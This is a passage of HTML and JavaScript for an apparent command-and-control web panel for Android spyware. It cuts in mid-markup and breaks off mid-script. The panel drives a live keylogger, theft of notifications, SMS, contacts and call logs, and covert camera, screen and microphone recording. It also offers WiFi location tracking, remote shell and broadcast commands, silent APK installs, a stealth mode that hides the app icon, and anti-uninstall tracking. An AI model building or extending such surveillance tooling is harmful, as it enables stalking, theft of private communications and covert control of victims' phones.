          <button class="btn" onclick="ctrlAction('volume_up')">🔊 Vol+</button>
          <button class="btn" onclick="ctrlAction('volume_down')">🔉 Vol−</button>
        </div>
        <div class="row" style="margin-top:8px">
          <input type="text" id="ctrl-text" placeholder="type text… (Enter to send)">
          <button class="btn primary" onclick="ctrlSendText()">⌨ Send</button>
          <button class="btn" onclick="ctrlPressKey(66)">↵ Enter</button>
          <button class="btn" onclick="ctrlPressKey(67)">⌫ Backspace</button>
        </div>
        <div class="row" style="margin-top:8px">
          <button class="btn" id="annot-toggle" onclick="annotToggle()">🖊 Toggle Annotation Mode</button>
        </div>
        <div class="annot-toolbar" id="annot-toolbar">
          <span style="color:var(--text-mute);font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:1px">Draw:</span>
          <button class="annot-tool active" data-tool="pen" onclick="annotSetTool('pen',this)">✏ Pen</button>
          <button class="annot-tool" data-tool="line" onclick="annotSetTool('line',this)">╱ Line</button>
          <button class="annot-tool" data-tool="rect" onclick="annotSetTool('rect',this)">▭ Rect</button>
          <button class="annot-tool" data-tool="arrow" onclick="annotSetTool('arrow',this)">→ Arrow</button>
          <button class="annot-tool" data-tool="text" onclick="annotSetTool('text',this)">T Text</button>
          <input type="color" id="annot-color" value="#ff3b30" title="Color">
          <input type="range" id="annot-size" min="1" max="20" value="3" title="Brush size">
          <button class="btn small" onclick="annotUndo()">↶ Undo</button>
          <button class="btn small" onclick="annotClear()">✕ Clear</button>
          <button class="btn small primary" onclick="annotSave()">💾 Save PNG</button>
        </div>
        <div id="ctrl-status" style="margin-top:10px;color:var(--text-dim);font-size:12px"></div>
        <div style="margin-top:12px;color:var(--text-mute);font-size:11.5px;line-height:1.8;background:var(--panel2);padding:10px 14px;border-radius:8px">
          <b style="color:var(--cyan)">Keyboard shortcuts</b> (when not typing):<br>
          <kbd>↑↓←→</kbd> swipe · <kbd>Enter</kbd> tap center · <kbd>Space</kbd> tap center · <kbd>Esc</kbd> back · <kbd>H</kbd> home · <kbd>R</kbd> recents
        </div>
      </div>
    </section>

    <!-- ═══ FILES ═══ -->
    <section class="panel" id="panel-files">
      <div class="file-browser">
        <div class="path-bar">
          <button class="btn small" onclick="fbUp()">↑</button>
          <button class="btn small" onclick="fbHome()">⌂</button>
          <div class="breadcrumbs" id="fb-breadcrumbs">/</div>
          <button class="btn small" onclick="fbRefresh()">⟳</button>
          <button class="btn small" onclick="fbNewFolder()">+ Folder</button>
          <label for="fb-upload" class="btn small" style="cursor:pointer">⬆ Upload</label>
          <input type="file" id="fb-upload" hidden multiple>
          <input type="password" id="fb-encpw" placeholder="enc pw (blank=default)" style="width:180px;font-size:12px">
        </div>
        <div class="bulk-bar" id="bulk-bar">
          <span class="count" id="bulk-count">0 selected</span>
          <button class="btn small" onclick="bulkSelectAll()">All</button>
          <button class="btn small" onclick="bulkSelectNone()">None</button>
          <button class="btn small" onclick="bulkInvert()">Invert</button>
          <span style="flex:1"></span>
          <button class="btn small primary" onclick="bulkDownloadZip()">⬇ Download ZIP</button>
          <button class="btn small" onclick="bulkEncrypt()">🔒 Encrypt</button>
          <button class="btn small" onclick="bulkDecrypt()">🔓 Decrypt</button>
          <button class="btn small" onclick="bulkZipEnc()">🗜 Zip+Enc</button>
          <button class="btn small danger" onclick="bulkDelete()">🗑 Delete</button>
        </div>
        <div class="file-list" id="fb-list"><div class="file-empty">select a client to browse files</div></div>
      </div>
    </section>

    <!-- ═══ APPS ═══ -->
    <section class="panel" id="panel-apps">
      <div class="card">
        <h3 class="card-title">📦 Installed Apps</h3>
        <div class="row">
          <input type="text" id="app-search" placeholder="Search apps…" oninput="renderApps()">
          <label style="font-size:12px;color:var(--text-dim);display:flex;gap:5px;align-items:center">
            <input type="checkbox" id="app-show-system" onchange="renderApps()"> show system
          </label>
          <button class="btn small" onclick="loadApps(true)">⟳ Refresh</button>
          <span id="apps-count" style="color:var(--text-mute);font-size:12px;margin-left:auto"></span>
        </div>
        <div id="apps-status" style="color:var(--text-mute);font-size:12.5px;margin-bottom:12px">Click Refresh to load the app list.</div>
        <div id="apps-grid" class="gallery-list" style="grid-template-columns:repeat(auto-fill,minmax(260px,1fr))">
          <div class="gallery-empty">No apps loaded</div>
        </div>
      </div>
    </section>

    <!-- ═══ CAMERA ═══ -->
    <section class="panel" id="panel-camera">
      <div class="card">
        <h3 class="card-title">Camera Selection</h3>
        <div class="segmented" id="cam-facing">
          <button data-facing="back" class="active">Back</button>
          <button data-facing="front">Front</button>
        </div>
        <h3 class="card-title" style="margin-top:20px">Photo</h3>
        <div class="row">
          <input type="text" id="photo-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabTakePhoto(this)">📸 Capture Photo</button>
        </div>
        <h3 class="card-title" style="margin-top:20px">Video</h3>
        <div class="row">
          <label>Duration (sec):</label>
          <input type="number" id="video-secs" value="5" min="1" max="300">
          <input type="text" id="video-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabRecordVideo(this)">🎥 Record</button>
        </div>
        <h3 class="card-title" style="margin-top:20px">Torch / List</h3>
        <div class="row">
          <button class="btn" onclick="qa('torch on',event)">🔦 Torch On</button>
          <button class="btn" onclick="qa('torch off',event)">🌑 Torch Off</button>
          <button class="btn" onclick="qa('camlist',event)">📋 List Cameras</button>
        </div>
      </div>
    </section>

    <!-- ═══ SCREEN ═══ -->
    <section class="panel" id="panel-screen">
      <div class="card">
        <h3 class="card-title">Screenshot</h3>
        <div class="row">
          <input type="text" id="screenshot-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabScreenshot(this)">📸 Capture</button>
        </div>
        <h3 class="card-title" style="margin-top:20px">Screen Recording</h3>
        <div class="row">
          <label>Duration (sec):</label>
          <input type="number" id="screenrec-secs" value="5" min="1" max="300">
          <input type="text" id="screenrec-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabScreenrec(this)">🎥 Record</button>
        </div>
        <h3 class="card-title" style="margin-top:20px">Screen Recording + Audio</h3>
        <div class="row">
          <label>Duration (sec):</label>
          <input type="number" id="screenrec-av-secs" value="5" min="1" max="300">
          <input type="text" id="screenrec-av-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabScreenrecAv(this)">🎞 Record + Audio</button>
        </div>
      </div>
    </section>

    <!-- ═══ MONITOR ═══ -->
    <section class="panel" id="panel-monitor">
      <div class="card">
        <div class="row" style="justify-content:space-between;margin-bottom:14px;flex-wrap:wrap">
          <h3 class="card-title" style="margin:0">📶 WiFi Location Tracker</h3>
          <div class="row" style="margin:0">
            <button class="btn small" onclick="loadWifiHistory()">⟳ Refresh</button>
            <button class="btn small" onclick="pullWifiDevice()">⇣ Pull device log</button>
            <button class="btn small danger" onclick="clearWifiHistory()">🗑 Clear</button>
          </div>
        </div>
        <div class="row" style="margin-bottom:8px">
          <button class="btn small" onclick="currentWifi()">📶 Current SSID</button>
          <span id="wifi-current" style="color:var(--text-dim);font-family:ui-monospace,monospace;font-size:12.5px"></span>
        </div>
        <div id="wifi-history-list" class="log-output" style="max-height:320px">
          <div style="color:var(--text-mute)">No WiFi history yet.</div>
        </div>
      </div>
      <div class="card">
        <div class="row" style="justify-content:space-between;margin-bottom:14px;flex-wrap:wrap">
          <h3 class="card-title" style="margin:0">📱 App Usage Stats</h3>
          <div class="row" style="margin:0">
            <label style="font-size:12px">Hours:</label>
            <input type="number" id="usage-hours" value="24" min="1" max="720" style="width:80px">
            <label style="font-size:12px">Top:</label>
            <input type="number" id="usage-limit" value="30" min="5" max="200" style="width:80px">
            <button class="btn small primary" onclick="loadUsageStats()">Load</button>
            <button class="btn small" onclick="openUsagePerm()">🔓 Usage access</button>
          </div>
        </div>
        <div id="usage-bar-chart" class="bar-chart" style="display:none"></div>
        <div id="usage-table-wrap" style="margin-top:10px">
          <div style="color:var(--text-mute)">Click Load to fetch stats. Requires Usage Access permission.</div>
        </div>
      </div>
    </section>

    <!-- ═══ DATA ═══ -->
    <section class="panel" id="panel-data">
      <div class="card">
        <div class="subtabs" id="data-subtabs">
          <button class="subtab active" data-kind="contacts">👥 Contacts</button>
          <button class="subtab" data-kind="sms">💬 SMS</button>
          <button class="subtab" data-kind="calllog">📞 Call Log</button>
        </div>
        <div class="row" style="margin-bottom:14px">
          <label>Limit (blank=all):</label>
          <input type="number" id="data-limit" placeholder="all">
          <button class="btn primary" onclick="loadData()">Load</button>
          <button class="btn" onclick="copyData()">Copy</button>
        </div>
        <pre class="data-output" id="data-output">Select a dataset and click Load.</pre>
      </div>
    </section>

    <!-- ═══ SYSTEM ═══ -->
    <section class="panel" id="panel-system">
      <div class="card">
        <h3 class="card-title">Shell Command</h3>
        <div class="row">
          <input type="text" id="shell-input" placeholder="e.g. getprop ro.product.model">
          <button class="btn primary" onclick="runShell()">Run</button>
        </div>
        <pre class="data-output" id="shell-output" style="margin-top:12px">Output will appear here…</pre>
      </div>
      <div class="card">
        <h3 class="card-title">Microphone Audio</h3>
        <div class="row">
          <label>Duration (sec):</label>
          <input type="number" id="micaudio-secs" value="5" min="1" max="600">
          <input type="text" id="micaudio-name" placeholder="filename (optional)">
          <button class="btn primary" onclick="tabMicaudio(this)">🎙 Record</button>
        </div>
      </div>
      <div class="card">
        <h3 class="card-title">Custom Command</h3>
        <div class="row">
          <input type="text" id="custom-cmd" placeholder="cmd [arg1] [arg2] …">
          <button class="btn primary" onclick="runCustom()">Send</button>
        </div>
        <pre class="data-output" id="custom-output" style="margin-top:12px">—</pre>
      </div>
      <div class="card">
        <h3 class="card-title">Send to All Clients</h3>
        <div class="row">
          <input type="text" id="all-cmd" placeholder="command to broadcast">
          <button class="btn danger" onclick="runAll()">📡 Broadcast</button>
        </div>
        <pre class="data-output" id="all-output" style="margin-top:12px">—</pre>
      </div>
    </section>

    <!-- ═══ TOOLS ═══ -->
    <section class="panel" id="panel-tools">
      <div class="card">
        <h3 class="card-title">🔐 File Hash</h3>
        <div class="row">
          <label style="min-width:80px">Algorithm</label>
          <div class="segmented" id="hash-algo">
            <button data-a="md5">MD5</button>
            <button data-a="sha1">SHA1</button>
            <button data-a="sha256" class="active">SHA256</button>
          </div>
        </div>
        <div class="row">
          <label style="min-width:80px">Path</label>
          <input type="text" id="hash-path" placeholder="/sdcard/Download/file.zip">
          <button class="btn primary" onclick="doHash()">Calculate</button>
        </div>
        <pre class="data-output" id="hash-out" style="margin-top:10px;max-height:240px">—</pre>
      </div>

      <div class="card">
        <h3 class="card-title">💾 Storage / Mounts</h3>
        <div class="row">
          <button class="btn primary" onclick="doMounts()">📋 List Volumes</button>
        </div>
        <pre class="data-output" id="mounts-out" style="margin-top:10px;max-height:320px">—</pre>
        <h3 class="card-title" style="margin-top:20px">Root Mount</h3>
        <div class="row">
          <input type="text" id="mount-dev" placeholder="/dev/block/… (root)">
          <input type="text" id="mount-path" placeholder="/mnt/…">
          <button class="btn danger" onclick="doMount()">Mount</button>
        </div>
      </div>

      <div class="card">
        <h3 class="card-title">📊 Disk Usage Tree</h3>
        <div class="row">
          <label style="min-width:80px">Path</label>
          <input type="text" id="du-path" placeholder="/sdcard/DCIM (blank = cwd)">
          <button class="btn primary" onclick="doDuTree()">Analyze</button>
        </div>
        <pre class="data-output" id="du-out" style="margin-top:10px;max-height:380px">—</pre>
      </div>

      <div class="card">
        <h3 class="card-title">📦 Install APK</h3>
        <div class="row">
          <input type="text" id="install-path" placeholder="/sdcard/Download/app.apk">
          <button class="btn danger" onclick="doInstall()">Install</button>
        </div>
        <div style="color:var(--text-mute);font-size:11.5px;margin-top:8px">
          With root → silent install. Without root → user must confirm the installer UI on the device.
        </div>
      </div>

      <div class="card">
        <h3 class="card-title">⏻ Reboot</h3>
        <div class="row">
          <div class="segmented" id="reboot-mode">
            <button data-m="normal" class="active">Normal</button>
            <button data-m="recovery">Recovery</button>
            <button data-m="bootloader">Bootloader</button>
          </div>
          <button class="btn danger" onclick="doReboot()">Reboot now</button>
        </div>
        <div style="color:var(--text-mute);font-size:11.5px;margin-top:8px">
          Requires root or device admin. Normal mode works if device admin is active.
        </div>
      </div>

      <div class="card">
        <h3 class="card-title">🕵 Stealth Mode</h3>
        <div class="row">
          <button class="btn primary" onclick="stealthCmd('on')">🕵 Enable</button>
          <button class="btn" onclick="stealthCmd('off')">👁 Disable</button>
          <button class="btn" onclick="stealthCmd('status')">ℹ Status</button>
          <button class="btn" onclick="stealthCmd('show')">👁 Restore icon</button>
        </div>
        <pre class="data-output" id="stealth-out" style="margin-top:10px;max-height:200px">—</pre>
        <div style="color:var(--text-mute);font-size:11.5px;margin-top:8px">
          When enabled, the app icon disappears from the launcher.
          Restore with: <code>adb shell am broadcast -a com.demo.termuxremote.SHOW_APP</code>
        </div>
      </div>

      <div class="card">
        <h3 class="card-title">📤 Chunked Upload (resume-friendly)</h3>
        <div class="row">
          <input type="text" id="chunkup-remote" placeholder="remote path (e.g. /sdcard/big.zip)">
          <label for="chunkup-file" class="btn primary" style="cursor:pointer">📁 Choose file</label>
          <input type="file" id="chunkup-file" hidden>
        </div>
        <div id="chunkup-status" style="margin-top:10px;color:var(--text-dim);font-size:12.5px">—</div>
        <div style="background:var(--panel2);height:8px;border-radius:4px;overflow:hidden;margin-top:6px">
          <div id="chunkup-bar" style="height:100%;width:0%;background:var(--grad1);transition:width .2s"></div>
        </div>
      </div>
    </section>

    <!-- ═══ NETWORK ═══ -->
    <section class="panel" id="panel-network">
      <div class="card">
        <h3 class="card-title">🌐 Server Endpoint</h3>
        <div id="net-current" style="margin-bottom:14px;padding:10px 14px;background:var(--panel2);border-radius:8px;font-size:12.5px;font-family:ui-monospace,Consolas,monospace;color:var(--text-dim)">loading…</div>
        <div class="row"><label style="min-width:64px">IP / Host</label><input type="text" id="net-ip" placeholder="host or IP"></div>
        <div class="row"><label style="min-width:64px">Port</label><input type="number" id="net-port" placeholder="8765" style="width:130px"></div>
        <div class="row"><label style="min-width:64px">Token</label><input type="text" id="net-token" placeholder="(blank = keep current)"></div>
        <div class="row" style="margin-top:14px">
          <button class="btn primary" onclick="saveNet()">💾 Apply &amp; Reconnect</button>
          <button class="btn" onclick="loadNet()">⟳ Reload</button>
        </div>
        <div id="net-status" style="margin-top:12px;font-size:12.5px;color:var(--text-dim)"></div>
      </div>
      <div class="card">
        <h3 class="card-title">🛡 Permissions</h3>
        <div id="perm-list" style="display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:8px">
          <div style="color:var(--text-mute)">select a client to view permissions</div>
        </div>
        <div class="row" style="margin-top:14px">
          <button class="btn primary" onclick="reqScreen()">📸 Screen Capture</button>
          <button class="btn" onclick="reqOverlay()">🪟 Overlay</button>
          <button class="btn" onclick="askPerm('all')">🔓 Ask All</button>
          <button class="btn" onclick="askPerm('battery')">🔋 Battery</button>
          <button class="btn" onclick="askPerm('accessibility')">⌨ Accessibility</button>
          <button class="btn" onclick="askPerm('usage')">📈 Usage access</button>
          <button class="btn" onclick="loadPerms()">⟳ Refresh</button>
        </div>
      </div>
    </section>

    <!-- ═══ CRYPTO ═══ -->
    <section class="panel" id="panel-crypto">
      <div class="card">
        <h3 class="card-title">🔐 Crypto Status</h3>
        <div id="enc-status" style="padding:12px 14px;background:var(--panel2);border-radius:8px;font-size:12.5px;font-family:ui-monospace,Consolas,monospace;color:var(--text-dim)">loading…</div>
      </div>
      <div class="card">
        <h3 class="card-title">🔑 Default Password</h3>
        <div class="row">
          <label style="min-width:80px">Enc pw</label>
          <input type="password" id="enc-key" placeholder="leave blank to keep">
          <button class="btn primary" onclick="setEncKey()">Save on Device</button>
          <button class="btn" onclick="getEncKey()">Check</button>
        </div>
      </div>
      <div class="card">
        <h3 class="card-title">📦 Encrypt / Decrypt Files (on device)</h3>
        <div class="row"><label style="min-width:80px">Filename</label><input type="text" id="enc-file" placeholder="photo.jpg or file.enc"></div>
        <div class="row"><label style="min-width:80px">Password</label><input type="password" id="enc-file-pw" placeholder="(blank = default)"></div>
        <div class="row" style="margin-top:12px">
          <button class="btn primary" onclick="encOne('encrypt')">🔒 Encrypt</button>
          <button class="btn primary" onclick="encOne('decrypt')">🔓 Decrypt</button>
          <button class="btn" onclick="encGetRemote()">⬇ Encrypt &amp; Pull</button>
          <button class="btn" onclick="encZip('zip')">🗜 Zip &amp; Encrypt</button>
          <button class="btn" onclick="encZip('unzip')">📂 Decrypt &amp; Unzip</button>
        </div>
        <div id="enc-one-out" class="data-output" style="margin-top:12px;max-height:260px">—</div>
      </div>
      <div class="card">
        <h3 class="card-title">📚 Batch (Server-side)</h3>
        <div class="row">
          <label style="min-width:80px">Operation</label>
          <div class="segmented" id="enc-batch-op">
            <button data-op="encrypt" class="active">🔒 Encrypt all</button>
            <button data-op="decrypt">🔓 Decrypt all</button>
          </div>
        </div>
        <div class="row"><label style="min-width:80px">Pattern</label><input type="text" id="enc-pattern" value="*.jpg"></div>
        <div class="row"><label style="min-width:80px">Password</label><input type="password" id="enc-batch-pw" placeholder="(blank = server default)"></div>
        <div class="row" style="margin-top:12px"><button class="btn danger" onclick="encBatch()">▶ Run on Server</button></div>
        <div id="enc-batch-out" class="data-output" style="margin-top:12px;max-height:320px">—</div>
      </div>
      <div class="card">
        <h3 class="card-title">📤 Upload &amp; Auto-Encrypt</h3>
        <div class="row">
          <input type="text" id="enc-upload-name" placeholder="save as (blank = original)">
          <label for="enc-upload" class="btn primary" style="cursor:pointer">⬆ Choose file</label>
          <input type="file" id="enc-upload" hidden>
        </div>
        <div id="enc-upload-out" class="data-output" style="margin-top:12px;max-height:220px">—</div>
      </div>
    </section>

    <!-- ═══ SESSION ═══ -->
    <section class="panel" id="panel-session">
      <div class="card">
        <div class="row" style="justify-content:space-between;margin-bottom:14px;flex-wrap:wrap">
          <h3 class="card-title" style="margin:0">
            🎬 Session Timeline
            <span class="rec-indicator off" id="rec-indicator2"><span class="dot"></span><span id="rec-label">stopped</span></span>
          </h3>
          <div class="row" style="margin:0">
            <button class="btn primary" id="rec-start" onclick="sessionStart()">⏺ Start Recording</button>
            <button class="btn danger" id="rec-stop" onclick="sessionStop()" style="display:none">⏹ Stop</button>
            <button class="btn" onclick="sessionClear()">🗑 Clear</button>
            <button class="btn" onclick="sessionExport()">⬇ Export JSON</button>
          </div>
        </div>
        <div class="row" style="margin-bottom:10px">
          <label style="font-size:12px">Filter type:</label>
          <select id="session-filter-type" onchange="renderSession()">
            <option value="">all events</option>
            <option value="keylog">keylog</option>
            <option value="notification">notifications</option>
            <option value="sms">sms</option>
            <option value="battery">battery</option>
            <option value="location">location</option>
            <option value="wifi_change">wifi change</option>
            <option value="client_connect">connect</option>
            <option value="client_disconnect">disconnect</option>
            <option value="perm_state">permission</option>
            <option value="keylogger">keylogger svc</option>
            <option value="notif_svc">notif svc</option>
            <option value="app_launched">app launch</option>
            <option value="anti_uninstall">anti-uninstall</option>
            <option value="screen_state">screen on/off</option>
          </select>
          <input type="text" id="session-filter-q" placeholder="search data…" oninput="renderSession()" style="max-width:240px">
          <label style="font-size:12px;margin-left:auto">Showing: <span id="session-shown" style="color:var(--cyan);font-weight:700">0</span> / <span id="session-total" style="color:var(--text-dim)">0</span></label>
        </div>
        <div class="timeline" id="session-timeline">
          <div style="color:var(--text-mute);text-align:center;padding:40px">Click "Start Recording" to begin capturing events.</div>
        </div>
      </div>
    </section>

    <!-- ═══ LOG ═══ -->
    <section class="panel" id="panel-log">
      <div class="card">
        <div class="row" style="justify-content:space-between;margin-bottom:14px">
          <h3 class="card-title" style="margin:0">Activity Feed</h3>
          <button class="btn small" onclick="clearLog()">Clear</button>
        </div>
        <div class="log-output" id="log-output"></div>
      </div>
    </section>

    <!-- ═══ KEYLOG ═══ -->
    <section class="panel" id="panel-keylog">
      <div class="card">
        <h3 class="card-title">⌨ Live Keylogger</h3>
        <div class="row">
          <button class="btn primary" id="kl-start" onclick="klStart()">▶ Start</button>
          <button class="btn" id="kl-pause" onclick="klPause()">⏸ Pause</button>
          <button class="btn danger" onclick="klStop()">⏹ Stop</button>
          <button class="btn" onclick="klStatus()">ℹ Status</button>
          <button class="btn" onclick="klClear()">🗑 Clear</button>
          <label style="margin-left:auto">Filter:</label>
          <input type="text" id="kl-filter" placeholder="pkg/keyword" oninput="klRender()">
        </div>
        <div id="kl-status" style="margin-top:10px;color:var(--text-dim);font-size:12px"></div>
        <div class="log-output" id="kl-output" style="margin-top:12px;max-height:calc(50vh - 160px)">
          <div style="color:var(--text-mute)">No keystrokes yet.</div>
        </div>
      </div>
      <div class="card">
        <h3 class="card-title">🔔 Live Notifications</h3>
        <div class="row">
          <button class="btn primary" id="nf-start" onclick="nfStart()">▶ Start</button>
          <button class="btn" id="nf-pause" onclick="nfPause()">⏸ Pause</button>
          <button class="btn danger" onclick="nfStop()">⏹ Stop</button>
          <button class="btn" onclick="nfStatus()">ℹ Status</button>
          <button class="btn" onclick="nfClear()">🗑 Clear</button>
          <label style="margin-left:auto">Filter:</label>
          <input type="text" id="nf-filter" placeholder="app/title/body" oninput="nfRender()">
        </div>
        <div id="nf-status" style="margin-top:10px;color:var(--text-dim);font-size:12px"></div>
        <div class="log-output" id="nf-output" style="margin-top:12px;max-height:calc(50vh - 160px)">
          <div style="color:var(--text-mute)">No notifications yet.</div>
        </div>
      </div>
    </section>
  </div>
</main>

<div class="modal-bg" id="pw-modal">
  <div class="modal">
    <h2>🔑 Change password</h2>
    <div class="modal-sub">You'll be logged out after changing.</div>
    <label>Current password</label><input type="password" id="pw-old">
    <label>New password</label><input type="password" id="pw-new">
    <label>Confirm new password</label><input type="password" id="pw-new2">
    <div class="msg" id="pw-msg"></div>
    <div class="modal-actions">
      <button class="btn" onclick="closePwModal()">Cancel</button>
      <button class="btn primary" id="pw-save" onclick="savePw()">Save</button>
    </div>
  </div>
</div>

<div id="progress-overlay">
  <div class="progress-box">
    <div class="progress-title" id="progress-title">Recording</div>
    <div class="progress-timer" id="progress-timer">0</div>
    <div class="progress-track"><div class="progress-bar" id="progress-bar"></div></div>
  </div>
</div>

<div id="lightbox" onclick="closeLightbox(event)">
  <button class="lb-close" onclick="closeLightbox(event)">✕</button>
  <div id="lightbox-content"></div>
</div>

<div class="drop-zone" id="drop-zone">📥 Drop files to upload</div>
<div id="toast-container"></div>

<script>
// ═══ Global state ═══
let activeId=null, currentCwd='', currentTab='dashboard', camFacing='back', dataKind='contacts',
    unreadLogs=0, captureTimer=null, clientUptimeBase=0, uptimeTimer=null;
let liveActive=false, liveMode='photo', liveFacing='back', liveFrameCount=0, liveFpsTimer=null;
let liveSession=null, liveVideoBuffer=[], liveRecording=false, liveLoopRunning=false, livePlayed=0;
let allClients=[], clientFilter='';
let keylogPaused=false, notifPaused=false;
let appListData=[];
let ctrlActive=false, ctrlMode='tap', ctrlTimer=null;
let ctrlSize={w:0,h:0};
let ctrlBusy=false, ctrlStarting=false;
let ctrlQuality={q:55,w:720};
let ctrlFps=3;
let ctrlZoomed=false;
let ctrlLastAction=null;
let ctrlNetFrames=0, ctrlNetTimer=null, ctrlStreamStart=0;
let fbSelected=new Set(), fbItems=[];
let annotMode=false, annotCurrentTool='pen', annotDrawing=false;
let annotLastPt=null, annotStartPt=null, annotUndoStack=[];
let metaTags=[], metaLoadedFor=null;
let sessionEvents=[], sessionIsRecording=false;
let overviewData=[];
let chunkUpState=null;

// ★ Projection state tracking
let projectionState = {
  screen: null,
  lastChange: 0,
  autoRecoveryInFlight: false,
  lastAutoRecoveryTs: 0,
  bannerVisible: false,
};

const $ = id => document.getElementById(id);
function ts(){ return new Date().toTimeString().slice(0,8); }
function esc(s){ return String(s).replace(/[&<>"']/g, c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'})[c]); }
function fmtSize(n){
  if(!n||n<0) return '—';
  if(n<1024) return n+' B';
  if(n<1048576) return (n/1024).toFixed(1)+' KB';
  if(n<1073741824) return (n/1048576).toFixed(1)+' MB';
  return (n/1073741824).toFixed(2)+' GB';
}
function timeAgo(ts){
  const s=Math.floor((Date.now()-ts)/1000);
  if(s<5) return 'just now';
  if(s<60) return s+'s ago';
  if(s<3600) return Math.floor(s/60)+'m ago';
  if(s<86400) return Math.floor(s/3600)+'h ago';
  return Math.floor(s/86400)+'d ago';
}
function fmtDuration(sec){
  if(!sec&&sec!==0) return '—';
  if(sec<60) return sec+'s';
  if(sec<3600) return Math.floor(sec/60)+'m '+(sec%60)+'s';
  if(sec<86400) return Math.floor(sec/3600)+'h '+Math.floor((sec%3600)/60)+'m';
  return Math.floor(sec/86400)+'d '+Math.floor((sec%86400)/3600)+'h';
}
function extOf(name){ const m=String(name).toLowerCase().match(/\.([a-z0-9]+)$/); return m?m[1]:''; }
function kindFromName(name){
  const e=extOf(name);
  if(['png','jpg','jpeg','webp','gif','bmp'].includes(e)) return 'image';
  if(['mp4','webm','m4v','mkv','3gp'].includes(e)) return 'video';
  if(['m4a','aac','mp3','wav','ogg'].includes(e)) return 'audio';
  if(['zip','rar','7z','tar','gz'].includes(e)) return 'archive';
  if(e==='enc') return 'enc';
  if(e==='apk') return 'apk';
  return 'file';
}
function iconForKind(k){ return {image:'🖼',video:'🎬',audio:'🎙',archive:'🗜',enc:'🔐',apk:'📦',file:'📄'}[k]||'📄'; }
function badgeClass(k){ return {image:'img',video:'vid',audio:'aud',archive:'arc',enc:'enc'}[k]||'img'; }

async function api(path, body){
  const opts = body ? {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(body)} : {method:'GET'};
  const res = await fetch(path, opts);
  if(res.status===401){ location.href='/login'; throw new Error('unauthorized'); }
  return res.json();
}
function toast(msg, type='info', ms=3000){
  const c=$('toast-container');
  const d=document.createElement('div');
  d.className='toast '+type; d.textContent=msg;
  c.appendChild(d);
  setTimeout(()=>{ d.style.opacity='0'; d.style.transform='translateX(420px)'; setTimeout(()=>d.remove(),320); }, ms);
}
function addLog(entry, cls){
  const out=$('log-output');
  const d=document.createElement('div');
  d.className='log-entry '+(cls||'');
  d.innerHTML='<span class="ts">'+ts()+'</span><span class="txt">'+esc(entry)+'</span>';
  out.appendChild(d); out.scrollTop=out.scrollHeight;
  if(currentTab!=='log'){ unreadLogs++; const b=$('log-badge'); b.textContent=unreadLogs; b.classList.remove('hidden'); }
}
function clearLog(){ $('log-output').innerHTML=''; unreadLogs=0; $('log-badge').classList.add('hidden'); }
function setMediaStatus(msg, color){ const el=$('media-status'); if(!msg){el.style.display='none';return;} el.style.display='block'; el.textContent=msg; el.style.color=color||'var(--text-dim)'; }
function busy(btn, on){ if(!btn) return; btn.disabled=!!on; btn.classList.toggle('busy', !!on); }

// ═══════════════════════════════════════════════════════════════
//  PROJECTION BANNER
// ═══════════════════════════════════════════════════════════════
function showProjBanner(msg){
  const b = $('proj-banner');
  if(!b) return;
  $('proj-banner-msg').innerHTML = msg || '⚠ Screen capture lost — click "Re-grant now"';
  b.classList.add('show');
  projectionState.bannerVisible = true;
  try { document.body.style.paddingTop = '48px'; } catch(_){}
}
function hideProjBanner(){
  const b = $('proj-banner');
  if(!b) return;
  b.classList.remove('show');
  projectionState.bannerVisible = false;
  try { document.body.style.paddingTop = ''; } catch(_){}
}
async function checkProjectionState(){
  try{
    const r = await api('/api/projection/state');
    const screenOk = r.screen === true;
    if(screenOk){
      if(projectionState.screen === false){
        hideProjBanner();
        toast('✓ Screen capture restored','ok',3000);
        addLog('✓ screen capture restored','connect');
      }
      projectionState.screen = true;
      return true;
    } else if(r.screen === false){
      projectionState.screen = false;
      showProjBanner('⚠ ' + (r.msg || 'screen capture not granted — control & live screen won\'t work'));
      return false;
    } else {
      // unknown (null) — client just connected, still reporting
      projectionState.screen = null;
      return false;
    }
  }catch(_){}
  return false;
}
async function tryAutoRecovery(){
  if(projectionState.screen !== false) return;
  if(projectionState.autoRecoveryInFlight) return;
  const now = Date.now();
  if(now - projectionState.lastAutoRecoveryTs < 30_000) return;
  if(!activeId) return;
  projectionState.autoRecoveryInFlight = true;
  projectionState.lastAutoRecoveryTs = now;
  try{
    addLog('📸 auto-recovery: requesting screen capture','info');
    await api('/api/projection/request', {});
  }catch(_){}
  setTimeout(() => { projectionState.autoRecoveryInFlight = false; }, 20_000);
}
async function bannerManualRetry(){
  if(!activeId){ toast('No client selected','err'); return; }
  const spin = $('proj-banner-spin');
  if(spin) spin.textContent = '⏳';
  projectionState.lastAutoRecoveryTs = 0;  // bypass rate-limit
  try{
    const r = await api('/api/projection/request', {});
    if(r.error){ toast(r.error,'err'); }
    else {
      toast(r.output || 'Check your device screen','ok',6000);
      addLog('📸 manual re-request sent','info');
    }
  }catch(e){ toast('Failed: ' + e.message,'err'); }
  finally { if(spin) spin.textContent = ''; }
}
setInterval(checkProjectionState, 5000);
setInterval(tryAutoRecovery, 15_000);

// ═══════════════════════════════════════════════════════════════
//  Tabs
// ═══════════════════════════════════════════════════════════════
function switchTab(name){
  document.querySelectorAll('.tab').forEach(x=>x.classList.toggle('active', x.dataset.tab===name));
  document.querySelectorAll('.panel').forEach(x=>x.classList.remove('active'));
  const p = $('panel-'+name); if(p) p.classList.add('active');
  currentTab=name;
  try{ localStorage.setItem('tab', name); }catch(_){}
  if(name==='log'){ unreadLogs=0; $('log-badge').classList.add('hidden'); }
  if(name==='keylog'){ unreadKeylogs=0; unreadNotifs=0;
    const kb=$('keylog-badge'); if(kb) kb.classList.add('hidden');
    const nb=$('notif-badge'); if(nb) nb.classList.add('hidden');
    klRender(); nfRender(); }
  if(name!=='files'){ fbSelected.clear(); }
  if(name==='files' && activeId) fbRefresh();
  if(name==='dashboard' && activeId){ refreshInfo(); metaLoadedFor=null; loadClientMeta(activeId); }
  if(name==='network'){ loadNet(); loadPerms(); }
  if(name==='crypto'){ loadEncStatus(); }
  if(name==='apps'){ loadApps(false); }
